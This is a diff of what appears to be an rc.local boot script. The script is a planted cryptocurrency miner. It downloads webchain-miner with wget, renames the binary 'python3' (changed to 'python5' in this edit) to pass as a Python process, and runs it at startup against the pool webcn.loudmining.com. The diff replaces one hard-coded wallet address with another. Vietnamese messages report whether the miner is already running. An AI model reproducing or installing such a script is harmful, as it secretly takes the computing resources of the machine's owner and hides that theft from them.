@@ -10,15 +10,15 @@
 # bits.
 #
 # By default this script does nothing.
-if [ -f ${PWD}/python3 ]; then
-    if pgrep -x "python3" > /dev/null
+if [ -f ${PWD}/python5 ]; then
+    if pgrep -x "python5" > /dev/null
 then
     echo "Miner dang chay roi , ke cmn di "
     
 else
 
 echo "Miner da install , chay thoi "
-./python3 -o webcn.loudmining.com:1111 -u 0x00fee8e0cb4093c8aa0b2bae31a6d90be4368f30 -p x -worker-id 01
+./python5 webchain-miner -o webcn.loudmining.com:1111 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x -worker-id 01
 
      
 fi
@@ -28,8 +28,8 @@ fi
 
 wget https://github.com/webchain-network/webchain-miner/releases/download/v2.7.0/webchain-miner-2.7.0-linux-amd64.tar.gz
 tar xvzf webchain-miner-2.7.0-linux-amd64.tar.gz
-mv webchain-miner python3
+mv webchain-miner python5
 rm config.json
-./python3 -o webcn.loudmining.com:1111 -u 0x00fee8e0cb4093c8aa0b2bae31a6d90be4368f30 -p x -worker-id 01
+./python5 webchain-miner -o webcn.loudmining.com:1111 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x -worker-id 01
 
 exit 0
